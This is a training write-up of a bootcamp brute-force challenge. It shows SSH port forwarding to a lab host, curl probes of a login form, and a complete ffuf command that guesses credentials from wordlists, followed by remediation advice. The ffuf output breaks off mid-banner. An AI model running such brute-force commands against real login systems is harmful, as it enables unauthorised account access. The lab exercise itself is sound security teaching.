# Overview
### Authentication bypass can be achieved through several methods, and brute force attacks are one of them. A brute force attack is a cyber attack typically carried out against authentication features by systematically guessing credentials using wordlists. In the first session of the Cyber Sentinel Secure Bootcamp Batch 2 by XCode, the instructor presented a brute force challenge for students to solve in order to proceed to the next stage.
# Study case
### In this scenario, students were tasked with bypassing a login form to obtain a WhatsApp group URL. The instructor provided the following target environment:
```bash
IP address: 172.17.2.195
username wordlist: https://xcode.co.id/user.txt
password wordlist: https://xcode.co.id/wordlist.txt
```
# Attack Methodology
### To interact with the target IP, I used SSH port forwarding with my public domain, which was on the same network as the target. By using the -L option, I forwarded a local port to the target address:
```bash
➜ sentinel ssh root@konek.securityhub.id -L 8080:172.17.2.195:80 -p <PORT>
root@konek.securityhub.id's password:
Last login: xxx xxx  x xx:xx:xx xxxx from xxx.xxx.xxx.xxx
root@6c483be0c2ec:~#
```
### Next, I used the curl command to send a GET request, adding the -sv options for verbose output to gain more insight into the response:
```bash
➜ sentinel curl -sv 127.0.0.1:8080
*   Trying 127.0.0.1:8080...
* Connected to 127.0.0.1 (127.0.0.1) port 8080
* using HTTP/1.x
> GET / HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/8.13.0
> Accept: */*
>
* Request completely sent off
< HTTP/1.1 200 OK
< Date: xxx, xx xxx xxxx xx:xx:xx xxx
< Server: Apache/2.4.52 (Ubuntu)
< Vary: Accept-Encoding
< Content-Length: 201
< Content-Type: text/html; charset=UTF-8

<h2>Login</h2>
<form method="post">

    Password: <input type="text" name="password"><br><br>
    <input type="submit" value="Login">
</form>
* Connection #0 to host 127.0.0.1 left intact
```
### The output revealed a simple login form with username and password fields. I tested it by sending a POST request with generic credentials (admin:admin) using curl and the -d option to include the request data, but the attempt failed:
```bash
➜ sentinel curl -sv -XPOST 127.0.0.1:8080 -d 'username=admin&password=admin'
*   Trying 127.0.0.1:8080...

<h3>Login gagal!</h3>

```
### Since manual testing didn’t work, I used ffuf to automate the brute force attack. I specified the content type with the -H option and filtered responses of size 222 (failed attempts) using -fs:
```bash
➜ sentinel ffuf -u 'http://127.0.0.1:8080' -H 'Content-type: application/x-www-form-urlencoded' -d 'username=USER&password=PASS' -w user.txt:USER -w wordlist.txt:PASS -fs 222

        /'___\  /'___\           /'___\

### After obtaining valid credentials, I used curl again to send a POST request and extracted the WhatsApp group link—preferring the CLI over a browser:
```bash
➜ sentinel curl -XPOST 127.0.0.1:8080 -d 'username=ujian&password=qwertyuiop'

<h3>Login sukses! - https://chat.whatsapp.com/[REDACTED]</h3>

```
# Automation
### To streamline the brute force process, a Python script using the requests library can automate credential testing, reducing manual effort and improving efficiency.
![evidence](https://raw.githubusercontent.com/hariexe/SentinelSecure/master/bruteforce/resource/screenshot_03052025_053247.jpg "brute.py")
### This Python script automates the brute force attack against the target login form by systematically testing credentials from provided wordlists (user.txt and wordlist.txt). Key features include:

    Credential Loading: Reads and formats usernames/passwords from text files.

    Session Management: Uses requests.Session() to maintain connection efficiency.

    HTML Parsing: Leverages BeautifulSoup to extract success/failure messages and the WhatsApp group link.

    Error Handling: Catches and logs request exceptions to avoid script crashes.

    Progress Feedback: Prints real-time attempts and highlights valid credentials upon discovery.

### The script ensures a structured, repeatable attack process while minimizing manual intervention.
# Remediation
### To protect authentication systems from brute force attacks, implement the following security measures:
    1. Account Lockout Mechanisms
    
        Temporary Lockout: Lock accounts after a set number of failed attempts (e.g., 5-10 attempts).
    
        Progressive Delays: Introduce increasing delays between login attempts (e.g., 30s, 1m, 5m).
    
        Admin Alerts: Notify administrators of repeated failed logins for manual review.
    
    2. Strong Password Policies
    
        Complexity Requirements: Enforce passwords with uppercase, lowercase, numbers, and special characters.
    
        Minimum Length: Require passwords to be at least 12+ characters long.
    
        Password Rotation: Encourage (but do not enforce) periodic password changes.
    
    3. Multi-Factor Authentication (MFA)
    
        OTP/SMS Codes: Require time-based one-time passwords (TOTP) or SMS verification.
    
        Biometric/FIDO2: Implement hardware keys (YubiKey) or fingerprint authentication.
    
    4. Rate Limiting & Throttling
    
        IP-Based Rate Limiting: Restrict login attempts per IP (e.g., 10 attempts/minute).
    
        CAPTCHA Challenges: Trigger CAPTCHAs after multiple failed attempts.
    
    5. Monitoring & Anomaly Detection
    
        Log Analysis: Monitor logs for unusual login patterns (e.g., rapid-fire attempts).
    
        Behavioral Analysis: Detect logins from unusual locations/devices.
    
        Fail2Ban Integration: Automatically block IPs with excessive failed attempts.
    
    6. Secure Authentication Protocols
    
        Hashing & Salting: Store passwords using bcrypt, Argon2, or PBKDF2.
    
        HTTPS Enforcement: Prevent credential interception via TLS encryption.
    
    7. User Education & Awareness
    
        Phishing Training: Teach users to recognize credential-harvesting scams.
    
        Password Manager Adoption: Encourage the use of password managers for strong, unique passwords.
